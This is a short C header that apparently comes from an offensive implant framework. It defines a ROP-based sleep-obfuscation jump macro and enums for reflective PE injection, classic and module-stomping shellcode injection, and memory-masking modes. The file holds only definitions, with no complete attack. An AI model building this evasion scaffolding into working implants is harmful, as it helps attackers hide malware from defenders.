#ifndef EVASION_H
#define EVASION_H

#define OBF_JMP( i, p ) \
    if ( JmpBypass == SLEEPOBF_BYPASS_JMPRAX ) {   \
        Rop[ i ].Rax = U_PTR( p );                 \
    } if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) { \
        Rop[ i ].Rbx = U_PTR( & p );               \
    } else {                                       \
        Rop[ i ].Rip = U_PTR( p );                 \
    }

enum {
    KhReflection
} KH_INJ_PE;

enum {
    KhClassic,
    KhStomp
} KH_INJ_SC;

enum {
    MaskWait,
    MaskTimer,
    MaskApc
} KH_MASK;

enum {
    RegRax,
    RegRsi,
    RegRbx = 0x23
} KH_REG;

#endif // EVASION_H